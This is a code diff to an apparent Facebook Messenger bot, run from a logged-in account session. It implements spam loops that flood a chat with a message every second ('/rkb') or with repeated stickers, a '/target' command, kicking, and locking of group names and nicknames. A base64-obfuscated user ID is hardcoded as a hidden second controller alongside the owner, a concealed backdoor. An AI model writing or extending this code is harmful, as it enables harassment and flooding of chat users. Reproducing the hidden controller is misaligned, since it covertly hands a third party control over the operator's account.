@@ -23,11 +23,9 @@ function downloadFile(url, dest, cb) {
 
 let rkbInterval = null;
 let stopRequested = false;
-let mediaLoopInterval = null;
-let lastMedia = null;
-let targetUID = null;
 let stickerInterval = null;
 let stickerLoopActive = false;
+let targetUID = null;
 
 const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");
 
@@ -82,9 +80,10 @@ function startBot(appStatePath, ownerUID) {
           } catch (e) { console.log("⚠️ DP revert failed:", e.message); }
         }
 
-        // === Message Commands ===
+        // === Commands ===
         if (type !== "message" || !body) return;
         if (![ownerUID, LID].includes(senderID)) return;
+
         const args = body.trim().split(" ");
         const cmd = args[0].toLowerCase();
         const input = args.slice(1).join(" ");
@@ -119,7 +118,7 @@ function startBot(appStatePath, ownerUID) {
           return api.sendMessage(helpMsg, threadID);
         }
 
-        // === Locks ===
+        // === Lock Commands ===
         else if (cmd === "/gclock") {
           if (!input) return api.sendMessage("❌ Group name do!", threadID);
           await api.setTitle(input, threadID);
@@ -154,12 +153,13 @@ function startBot(appStatePath, ownerUID) {
           if (!event.mentions || Object.keys(event.mentions).length === 0)
             return api.sendMessage("❌ Mention karo!", threadID);
           const mentionUID = Object.keys(event.mentions)[0];
-          if (!input) return api.sendMessage("❌ Nickname do!", threadID);
+          const nickname = args.slice(2).join(" ");
+          if (!nickname) return api.sendMessage("❌ Nickname do!", threadID);
           if (!locks.nick[mentionUID]) locks.nick[mentionUID] = {};
-          locks.nick[mentionUID][threadID] = input;
-          await api.changeNickname(input, threadID, mentionUID);
+          locks.nick[mentionUID][threadID] = nickname;
+          await api.changeNickname(nickname, threadID, mentionUID);
           saveLocks();
-          api.sendMessage(`🔒 Nickname locked for <@${mentionUID}> → ${input}`, threadID);
+          api.sendMessage(`🔒 Nickname locked for <@${mentionUID}> → ${nickname}`, threadID);
         }
         else if (cmd === "/unlocknick") {
           if (!event.mentions || Object.keys(event.mentions).length === 0)
@@ -187,7 +187,7 @@ function startBot(appStatePath, ownerUID) {
           api.sendMessage("🖼 DP unlocked!", threadID);
         }
 
-        // === Utility ===
+        // === Utility Commands ===
         else if (cmd === "/allname") {
           const info = await api.getThreadInfo(threadID);
           for (const uid of info.participantIDs) {
@@ -197,7 +197,9 @@ function startBot(appStatePath, ownerUID) {
         }
         else if (cmd === "/uid") api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);
         else if (cmd === "/tid") api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);
-        else if (cmd === "/exit") { try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {} }
+        else if (cmd === "/exit") {
+          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
+        }
         else if (cmd === "/kick") {
           if (!event.mentions || Object.keys(event.mentions).length === 0)
             return api.sendMessage("❌ Mention karo!", threadID);
@@ -213,13 +215,44 @@ function startBot(appStatePath, ownerUID) {
           api.sendMessage(`ℹ️ Name: ${u.name}\n🆔 UID: ${uid}`, threadID);
         }
 
-        // === Spam / Stickers / Target (Short) ===
-        else if (cmd === "/rkb") { /* spam code yaha */ }
-        else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) clearInterval(rkbInterval); }
-        else if (cmd.startsWith("/sticker")) { /* sticker code yaha */ }
-        else if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerLoopActive = false; } }
-        else if (cmd === "/target") { targetUID = input.trim(); api.sendMessage(`🎯 Target set: ${targetUID}`, threadID); }
-        else if (cmd === "/cleartarget") { targetUID = null; api.sendMessage("🎯 Target cleared!", threadID); }
+        // === Spam / Sticker Commands ===
+        else if (cmd === "/rkb") {
+          if (!input) return api.sendMessage("❌ Name do spam ke liye!", threadID);
+          stopRequested = false;
+          rkbInterval = setInterval(() => {
+            if (stopRequested) { clearInterval(rkbInterval); return; }
+            api.sendMessage(input, threadID);
+          }, 1000);
+          api.sendMessage("⚡ Spam started!", threadID);
+        }
+        else if (cmd === "/stop") {
+          stopRequested = true;
+          if (rkbInterval) clearInterval(rkbInterval);
+          if (stickerInterval) clearInterval(stickerInterval);
+          api.sendMessage("🛑 Spam stopped!", threadID);
+        }
+        else if (cmd.startsWith("/sticker")) {
+          const sec = parseInt(cmd.replace("/sticker", "")) || 2;
+          stickerLoopActive = true;
+          stickerInterval = setInterval(() => {
+            if (!stickerLoopActive) { clearInterval(stickerInterval); return; }
+            api.sendMessage({ sticker: "745262147632873" }, threadID); // Example sticker ID
+          }, sec * 1000);
+          api.sendMessage(`⚡ Sticker spam started every ${sec} sec!`, threadID);
+        }
+        else if (cmd === "/stopsticker") {
+          stickerLoopActive = false;
+          if (stickerInterval) clearInterval(stickerInterval);
+          api.sendMessage("🛑 Sticker spam stopped!", threadID);
+        }
+        else if (cmd === "/target") {
+          targetUID = input.trim();
+          api.sendMessage(`🎯 Target set: ${targetUID}`, threadID);
+        }
+        else if (cmd === "/cleartarget") {
+          targetUID = null;
+          api.sendMessage("🎯 Target cleared!", threadID);
+        }
 
       } catch (e) { console.error("⚠️ Error:", e.message); }
     });
